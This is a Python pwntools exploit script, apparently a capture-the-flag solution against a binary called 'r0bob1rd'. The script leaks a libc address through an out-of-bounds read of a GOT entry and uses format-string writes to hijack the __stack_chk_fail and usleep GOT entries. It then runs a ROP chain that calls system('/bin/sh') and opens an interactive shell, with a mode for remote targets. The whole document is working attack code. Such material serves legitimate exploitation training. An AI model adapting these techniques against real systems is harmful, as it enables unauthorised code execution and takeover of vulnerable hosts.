#!/usr/bin/env python3

from pwn import *

e = ELF("./r0bob1rd_patched")
libc = ELF('./glibc/libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      b *(operation+236)
                      b *(operation+0x129)
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def write(writes):
    # printf_payload = b'AAAAAAAA%1$p%2$p%3$p%4$p%5$p%6$p%7$p%8$p%9$p' # Use this to determine the offset 8 below.
    printf_payload = fmtstr_payload(offset=8, writes=writes)
    # fgets reads (size-1) at most, including the new line. Thus we need 106 - 2 = 104 chars.
    printf_payload += b'a' * (104 - len(printf_payload))
    return printf_payload


def main():
    r = conn()

    # OOB, FSB, 2-byte BO in operation()
    # 1. Use the OOB to print out the got entry value => calculate the libc base address.
    info(f'The robobirdNames address is {hex(e.sym.robobirdNames)}')
    info(f'The printf@got address is {hex(e.got.printf)}')
    diff = e.got.printf - e.sym.robobirdNames
    choice = diff // 8
    info(f'The diff is {diff}, we need to input {choice}')
    r.sendlineafter(b'>', str(choice).encode('ascii'))
    printf_got_addr_str = r.recvuntil(b'>').split()[2]
    printf_got_addr = u64(printf_got_addr_str.ljust(8, b'\x00'))
    info(f'The actual printf@got value is {hex(printf_got_addr)}')
    offset = libc.sym.printf - libc.address
    libc.address = printf_got_addr - offset
    info(f'The libc base address is {hex(libc.address)}')
    system_addr = libc.sym.system
    info(f'The system() address is {hex(system_addr)}')

    # 2. Use the FSB to overwrite the __stack_chk_fail() to operation() for continous write access,
    # then Use the BO to overflow to trigger __stack_chk_fail(),
    printf_payload = write({ e.got.__stack_chk_fail: e.sym.operation })
    r.sendline(printf_payload)

    # 3. Use FSB to overwrite the usleep() to pop-ret chain, prepare for next ROP chains on stack.
    r.sendlineafter(b'>', b'1')
    rop = ROP(e)
    pop2 = rop.find_gadget(['pop r13', 'pop r14', 'pop r15', 'ret'])[0]
    printf_payload = write({ e.got.usleep: pop2 })
    r.sendline(printf_payload)

    # 4. ROP attack, the usleep() above will trigger the chain.
    r.sendlineafter(b'>', b'1')
    bin_sh = next(libc.search(b'/bin/sh'))
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    printf_payload = flat(
            pop_rdi, bin_sh,
            libc.sym.system,
            )
    r.sendline(printf_payload)

    r.interactive()

if __name__ == "__main__":
    main()
